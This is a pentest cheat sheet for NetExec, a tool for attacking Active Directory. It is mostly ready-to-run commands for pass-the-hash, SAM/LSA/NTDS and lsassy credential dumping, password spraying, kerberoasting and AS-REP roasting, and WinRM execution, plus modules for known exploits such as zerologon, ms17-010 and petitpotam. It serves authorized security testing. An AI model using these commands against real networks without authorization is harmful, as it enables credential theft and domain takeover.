# 03.21 NetExec

> Successor to CrackMapExec — Swiss Army knife for AD enumeration, lateral execution, credential dumping.

## Overview

NetExec (`nxc`) sweeps SMB/WinRM/RDP/MSSQL/SSH/LDAP/FTP services across a target list, validates credentials, executes commands, dumps creds, runs custom modules. Replaces the deprecated CrackMapExec. Critical for AD pentest workflows — pair with Impacket for deeper targeted operations.

## Steps

- **Step 1** - Install via pipx (cleanest).
- **Step 2** - Run protocol-specific commands with creds.
- **Step 3** - Use `--module <name>` for specific tooling (lsassy, gpp_password, etc.).

## Commands

### Install

```bash
pipx install netexec
# verify
nxc --version
```

### SMB sweep with creds

```bash
nxc smb <CIDR> -u <USER> -p <PASS> -d <DOMAIN>
# shows accessible hosts + admin rights
```

### Pass-the-Hash

```bash
nxc smb <TARGET> -u <USER> -H <NT-HASH> -d <DOMAIN>
```

### Local enumeration via SMB

```bash
nxc smb <TARGET> -u <USER> -p <PASS> --shares
nxc smb <TARGET> -u <USER> -p <PASS> --loggedon-users
nxc smb <TARGET> -u <USER> -p <PASS> --sessions
nxc smb <TARGET> -u <USER> -p <PASS> --disks
nxc smb <TARGET> -u <USER> -p <PASS> --pass-pol
```

### Credential dumping

```bash
nxc smb <TARGET> -u <USER> -p <PASS> --sam
nxc smb <TARGET> -u <USER> -p <PASS> --lsa
nxc smb <TARGET> -u <USER> -p <PASS> --ntds
nxc smb <TARGET> -u <USER> -p <PASS> -M lsassy
```

### Password spray

```bash
nxc smb <TARGET-LIST> -u users.txt -p 'Spring2025!' --continue-on-success
```

### LDAP enumeration

```bash
nxc ldap <DC> -u <USER> -p <PASS> -d <DOMAIN> --users
nxc ldap <DC> -u <USER> -p <PASS> -d <DOMAIN> --asreproast asrep.txt
nxc ldap <DC> -u <USER> -p <PASS> -d <DOMAIN> --kerberoasting kerb.txt
nxc ldap <DC> -u <USER> -p <PASS> -d <DOMAIN> --gmsa
```

### WinRM execution

```bash
nxc winrm <TARGET> -u <USER> -p <PASS> -d <DOMAIN> -x whoami
nxc winrm <TARGET> -u <USER> -H <NT-HASH> -X 'Get-Process'
```

### Module reference

```bash
nxc smb -L                                           # list all modules
nxc smb <TARGET> -u <USER> -p <PASS> -M gpp_password
nxc smb <TARGET> -u <USER> -p <PASS> -M coerce_plus
nxc smb <TARGET> -u <USER> -p <PASS> -M zerologon
nxc smb <TARGET> -u <USER> -p <PASS> -M ms17-010
nxc smb <TARGET> -u <USER> -p <PASS> -M printerbug
nxc smb <TARGET> -u <USER> -p <PASS> -M petitpotam
```
